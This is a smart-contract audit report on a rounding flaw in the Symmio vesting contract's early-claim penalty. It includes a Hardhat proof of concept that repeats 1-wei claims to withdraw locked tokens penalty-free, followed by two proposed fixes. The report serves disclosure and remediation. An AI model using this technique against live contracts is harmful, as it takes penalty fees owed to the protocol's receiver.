# Integer Rounding in Penalty Calculation Allows Users to Bypass Early Withdrawal Penalties

### Summary

Due to integer rounding in the penalty calculation, users can bypass the early withdrawal penalty by making multiple small claims of 1 wei each, allowing them to extract their entire vested allocation (or only a fraction) without incurring the intended penalty. While this attack requires numerous transactions, it remains economically viable on Layer 2 solutions like Base where transaction costs are lower and batching is possible.

### Root Cause

The [Vesting.sol::_claimLockedToken()](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/vesting/Vesting.sol#L290) function calculates penalties for early withdrawals using integer division:

`uint256 penalty = (amount * lockedClaimPenalty) / 1e18;`

When a user claims exactly 1 wei and the `lockedClaimPenalty` is set to 50% (5e17) which is a hardcoded value in the [SymmVesting::initialize()](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/vesting/SymmVesting.sol#L77) function, the calculation becomes:

`penalty = (1 * 5e17) / 1e18 = 0.5`

Since Solidity performs integer division, this value rounds down to 0, effectively allowing the user to claim tokens without any penalty. By making multiple small claims of 1 wei each, a user can withdraw their entire vested amount penalty-free.

While executing thousands of transactions might seem impractical due to gas costs, this attack becomes economically viable on Layer 2 solutions like Base where:

1. Transaction costs are significantly lower
2. Transactions can be batched or bundled
3. If the Token price of $SYMM skyrockets and outweights the gas costs

### Internal Pre-conditions

1. Vesting contract needs to be deployed
2. Vesting Plans need to be setup via setupVestingPlans()

### External Pre-conditions

- Token price of $SYMM must outweight the gas price

### Attack Path

There are two scenarios to exploit this: 

1. The attacker calls claimLockedToken() directly to withdraw locked SYMM tokens.
2. The attacker calls SymmVesting::addLiquidity() to add liquidity by converting a portion of SYMM vesting into SYMM LP tokens. This will lock the LP tokens in the Vesting contract and the attacker can now start to withdraw these tokens via multiple smaller withdrawals.

### Impact

1. Users can extract any amount of their vested tokens without paying any penalty, regardless of the vesting schedule or intended lock period.
2. Loss of penalty fees that would otherwise go to the lockedClaimPenaltyReceiver


### PoC

Paste below PoC in `vesting.behavior.ts` and run it with `npx hardhat test --grep "drainWithoutPenalty vulnerability"`

```Javascript
	export function ShouldBehaveLikeVesting() {
	let context: RunContext
	let symmVesting: SymmVesting
	let vestingPlanOps: VestingPlanOps__factory
	let admin: Signer, user1: Signer
	let symmToken: Symmio

	beforeEach(async () => {
		context = await loadFixture(initializeFixture)
		symmVesting = await context.vesting
		vestingPlanOps = await ethers.getContractFactory("VestingPlanOps")
		symmToken = context.symmioToken
		admin = context.signers.admin
		user1 = context.signers.user1
	})

	describe("drainWithoutPenalty vulnerability", () => {
		beforeEach(async () => {
			await context.symmioToken.connect(context.signers.admin).mint(await symmVesting.getAddress(), 5000)
			const users = [await context.signers.user1.getAddress()]
			const amounts = ["1000"]
			const now = new Date()
			const startTime = Math.floor(now.getTime() / 1000)
	
			now.setMonth(now.getMonth() + 9)
			const endTime = Math.floor(now.getTime() / 1000)
	
			await symmVesting.setupVestingPlans(await context.symmioToken.getAddress(), startTime, endTime, users, amounts)
		})
	
		it("Should allow users to drain without penalty via multiple small claims", async () => {
			const user = context.signers.user1
			const userAddress = await user.getAddress()
			const token = await context.symmioToken.getAddress()
			
			// Check initial balance
			const balanceBefore = await context.symmioToken.balanceOf(userAddress)
			await expect(balanceBefore).to.equal(0)
			
			// Get user's vested amount
			const plan = await symmVesting.vestingPlans(token, userAddress)
			const userAmount = plan.amount
			
			// Make many small claims
			const amount = 1
			for (let i = 0; i < 1000; i++) {
				await symmVesting.connect(user).claimLockedToken(token, amount)
			}
			
			// Check final balance
			const balanceAfter = await context.symmioToken.balanceOf(userAddress)
			console.log("Balance after claims:", balanceAfter.toString())
			
			// User should receive their full amount without the expected penalty
			await expect(balanceAfter).to.equal(userAmount)
		})
	})
        }
```

### Mitigation

To fix this vulnerability, implement one of the following solutions:

1. Enforce a minimum claim amount: Require that claims be above a certain threshold where the penalty calculation would result in at least 1 wei.

```Solidity
function _claimLockedToken(address token, address user, uint256 amount) internal {
    // First, claim any unlocked tokens.
    _claimUnlockedToken(token, user);
    VestingPlan storage vestingPlan = vestingPlans[token][user];
    if (vestingPlan.lockedAmount() < amount) revert InvalidAmount();
    
    // Ensure minimum claim amount to prevent penalty bypass
    uint256 minClaimAmount = 1e18 / lockedClaimPenalty + 1;
    if (amount < minClaimAmount) revert ClaimAmountTooSmall();
    
    // Rest of the function remains the same
    // ...
}
```

2. Round up instead of down: Ensure that even the smallest claim incurs at least 1 wei in penalty if the calculated value is non-zero.

```Solidity
function _claimLockedToken(address token, address user, uint256 amount) internal {
     // ---- SNIP -----
    
    // Calculate penalty with ceiling for non-zero values
    uint256 rawPenalty = amount * lockedClaimPenalty;
    uint256 penalty = rawPenalty / 1e18;
    // If there's a remainder and penalty would be 0, make it at least 1
    if (penalty == 0 && rawPenalty > 0) {
        penalty = 1;
    }
}
```
